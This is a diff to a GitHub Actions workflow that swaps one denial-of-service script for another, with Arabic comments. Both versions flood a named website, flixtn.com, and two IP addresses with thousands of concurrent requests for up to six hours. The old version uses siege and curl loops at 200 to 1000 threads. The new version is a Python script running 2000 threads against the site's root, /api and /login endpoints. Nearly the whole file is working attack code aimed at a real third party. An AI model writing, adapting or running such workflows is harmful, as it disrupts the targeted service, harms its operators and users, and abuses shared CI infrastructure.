@@ -1,119 +1,112 @@
-name: 💀 SHADOW MODE V99 - MASSIVE ATTACK
+name: 💀 UNLEASHED - NO LIMITS
 
 on:
   workflow_dispatch:
     inputs:
       duration:
-        description: 'مدة الهجوم بالدقائق (30-360)'
+        description: 'مدة الهجوم بالدقائق'
         required: true
-        default: '60'
-      intensity:
-        description: 'كثافة الهجوم (normal = 200 req/sec, high = 500 req/sec, extreme = 1000 req/sec)'
-        required: true
-        default: 'high'
-        type: choice
-        options:
-          - normal
-          - high
-          - extreme
+        default: '30'
 
 jobs:
-  massive_attack:
+  unleashed:
     runs-on: ubuntu-latest
     timeout-minutes: 360
     
     steps:
-      - name: ⚔️ Install attack arsenal
+      - name: Install Python & tools
         run: |
           sudo apt update
-          sudo apt install -y curl parallel siege htop
+          sudo apt install -y python3 python3-pip
+          pip3 install requests --break-system-packages || pip3 install requests
           
-      - name: 🎯 Launching Shadow Core
+      - name: Create nuclear attack script
         run: |
-          echo "╔══════════════════════════════════════════════════════════╗"
-          echo "║     💀 SHADOW MODE V99 - TOTAL ANNIHILATION MODE 💀      ║"
-          echo "╚══════════════════════════════════════════════════════════╝"
-          echo ""
-          echo "🎯 Target: flixtn.com"
-          echo "🎯 IPs: 64.29.17.65 + 216.198.79.65"
-          echo "⏱️  Duration: ${{ github.event.inputs.duration }} minutes"
-          echo "⚡ Intensity: ${{ github.event.inputs.intensity }}"
-          echo ""
+          cat > nuclear.py << 'EOF'
+          import requests
+          import threading
+          import time
+          import sys
+          from concurrent.futures import ThreadPoolExecutor
           
-          # تحديد كثافة الهجوم
-          case "${{ github.event.inputs.intensity }}" in
-            "normal")
-              THREADS=200
-              DELAY=0.05
-              ;;
-            "high")
-              THREADS=500
-              DELAY=0.02
-              ;;
-            "extreme")
-              THREADS=1000
-              DELAY=0.01
-              ;;
-          esac
+          target = "https://flixtn.com"
+          targets = [
+              "https://flixtn.com/",
+              "https://flixtn.com/api",
+              "https://flixtn.com/login",
+              "https://64.29.17.65/",
+              "https://216.198.79.65/",
+          ]
           
-          END_TIME=$((SECONDS + (${{ github.event.inputs.duration }} * 60)))
-          TOTAL=0
-          SUCCESS=0
-          FAILED=0
+          stats = {"total": 0, "success": 0, "fail": 0}
+          lock = threading.Lock()
+          running = True
           
-          # إنشاء قائمة أهداف متعددة
-          cat > targets.txt << 'EOF'
-          https://flixtn.com/
-          https://flixtn.com/api
-          https://flixtn.com/login
-          https://flixtn.com/wp-admin
-          https://flixtn.com/.env
-          https://64.29.17.65/
-          https://216.198.79.65/
-          https://flixtn.com/sitemap.xml
-          https://flixtn.com/robots.txt
+          def attack(url):
+              global running
+              while running:
+                  try:
+                      r = requests.get(
+                          url, 
+                          timeout=3,
+                          headers={
+                              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+                              'Cache-Control': 'no-cache',
+                              'Pragma': 'no-cache'
+                          }
+                      )
+                      with lock:
+                          stats["total"] += 1
+                          if r.status_code < 500:
+                              stats["success"] += 1
+                          else:
+                              stats["fail"] += 1
+                  except:
+                      with lock:
+                          stats["total"] += 1
+                          stats["fail"] += 1
+          
+          print("💀 NUCLEAR ATTACK MODE ACTIVATED 💀")
+          print(f"Target: {target}")
+          print(f"Threads: 2000")
+          print("-----------------------------------")
+          
+          # تشغيل 2000 خيط
+          with ThreadPoolExecutor(max_workers=2000) as executor:
+              futures = []
+              for t in targets:
+                  for _ in range(400):
+                      futures.append(executor.submit(attack, t))
+              
+              start = time.time()
+              duration = int(sys.argv[1]) * 60 if len(sys.argv) > 1 else 1800
+              
+              while time.time() - start < duration:
+                  time.sleep(5)
+                  with lock:
+                      print(f"[{int(time.time() - start)}s] Total: {stats['total']} | Success: {stats['success']} | Fail: {stats['fail']}")
+              
+              running = False
+              time.sleep(2)
+              
+              print("\n📊 FINAL STATISTICS:")
+              print(f"   Total requests: {stats['total']}")
+              print(f"   Success: {stats['success']}")
+              print(f"   Failed: {stats['fail']}")
+              print(f"   Success rate: {stats['success']/stats['total']*100:.1f}%" if stats['total'] > 0 else "   Success rate: 0%")
           EOF
           
-          echo "🔥 SHADOW ENGINES ACTIVATED 🔥"
+      - name: 🔥 Execute Nuclear Attack
+        run: |
+          echo "╔════════════════════════════════════════════════╗"
+          echo "║     💀 UNLEASHED SHADOW MODE - NO LIMITS 💀     ║"
+          echo "╚════════════════════════════════════════════════╝"
+          echo ""
+          echo "🎯 Target: flixtn.com + IPs"
+          echo "⚡ Threads: 2000 concurrent"
+          echo "⏱️  Duration: ${{ github.event.inputs.duration }} minutes"
+          echo ""
+          echo "🔥 ATTACK IN PROGRESS 🔥"
           echo ""
           
-          while [ $SECONDS -lt $END_TIME ]; do
-            # الموجة 1: Siege على كل الأهداف
-            siege -c $THREADS -t 10s -f targets.txt -b --quiet &
-            
-            # الموجة 2: Curl flood على HTTPS
-            for i in $(seq 1 $THREADS); do
-              curl -s -o /dev/null -w "%{http_code}\n" https://flixtn.com/ --max-time 3 &
-            done
-            
-            # الموجة 3: ضرب IP المباشر
-            for i in $(seq 1 $THREADS); do
-              curl -s -o /dev/null -w "%{http_code}\n" https://64.29.17.65/ --max-time 3 &
-            done
-            
-            # الموجة 4: استهداف HTTP (بدون SSL) لزيادة الضغط
-            for i in $(seq 1 200); do
-              curl -s -o /dev/null http://64.29.17.65/ --max-time 2 &
-            done
-            
-            TOTAL=$((TOTAL + (THREADS * 3) + 200))
-            
-            # عرض الحالة كل 10 ثواني
-            if [ $((SECONDS % 10)) -eq 0 ]; then
-              REMAINING=$((END_TIME - SECONDS))
-              echo "[$(date +%H:%M:%S)] 🔥 Wave: $TOTAL requests | ⏱️  Remaining: $((REMAINING / 60))m $((REMAINING % 60))s | ⚡ Intensity: ${{ github.event.inputs.intensity }}"
-            fi
-            
-            sleep $DELAY
-          done
-          
-          echo ""
-          echo "╔══════════════════════════════════════════════════════════╗"
-          echo "║              ✅ SHADOW MISSION COMPLETE ✅                ║"
-          echo "╚══════════════════════════════════════════════════════════╝"
-          echo ""
-          echo "📊 STATISTICS:"
-          echo "   Total requests sent: $TOTAL"
-          echo "   Duration: ${{ github.event.inputs.duration }} minutes"
-          echo "   Average rate: $((TOTAL / (${{ github.event.inputs.duration }} * 60))) req/sec"
-          echo ""
+          python3 nuclear.py ${{ github.event.inputs.duration }}
